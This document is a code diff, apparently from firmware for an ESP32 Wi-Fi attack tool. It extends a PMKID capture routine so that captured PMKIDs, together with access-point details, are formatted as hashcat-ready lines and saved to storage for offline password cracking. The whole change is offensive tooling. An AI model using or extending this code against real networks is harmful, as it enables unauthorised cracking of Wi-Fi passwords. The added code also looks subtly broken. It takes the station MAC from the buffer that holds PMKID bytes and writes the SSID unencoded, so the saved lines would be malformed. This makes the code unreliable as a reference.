@@ -26,6 +26,7 @@
 #include "wifi_controller.h"
 #include "frame_analyzer.h"
 #include "frame_analyzer_types.h"
+#include "pcap_serializer.h"
 
 static const char* TAG = "main:attack_pmkid";
 static const wifi_ap_record_t *ap_record = NULL;
@@ -79,12 +80,46 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
     strcpy(content, (char *) ap_record->ssid);
     content += strlen((char *) ap_record->ssid);
 
-    // copy PMKIDs into continuous memory into "content" in status, freeing as we go
+    // copy PMKIDs into continuous memory into "content" in status, freeing as we go,
+    // and build a hashcat-ready line for each one so the result survives a reboot.
+    char *save_ptr = content;
+    char hashcat_line[256];
+    bool saved = false;
+
     pmkid_item_t *item = pmkid_item_head;
     while (item != NULL) {
         pmkid_item_t *next = item->next;
         memcpy(content, item->pmkid, 16);
         content += 16;
+
+        if (!saved) {
+            char pmkid_hex[33];
+            char ap_hex[13];
+            char sta_hex[13];
+            for (unsigned i = 0; i < 16; i++) {
+                snprintf(&pmkid_hex[i * 2], 3, "%02x", item->pmkid[i]);
+            }
+            pmkid_hex[32] = '\0';
+            for (unsigned i = 0; i < 6; i++) {
+                snprintf(&ap_hex[i * 2], 3, "%02x", ap_record->bssid[i]);
+            }
+            ap_hex[12] = '\0';
+            const uint8_t *sta = (const uint8_t *) save_ptr;
+            for (unsigned i = 0; i < 6; i++) {
+                snprintf(&sta_hex[i * 2], 3, "%02x", sta[i]);
+            }
+            sta_hex[12] = '\0';
+
+            snprintf(hashcat_line, sizeof(hashcat_line), "%s*%s*%s*%s",
+                     pmkid_hex, ap_hex, sta_hex, (char *) ap_record->ssid);
+
+            if (pcap_serializer_write_text("pmkid", ap_record->ssid,
+                                           strlen((char *) ap_record->ssid),
+                                           hashcat_line)) {
+                saved = true;
+            }
+        }
+
         free(item);
         item = next;
     }
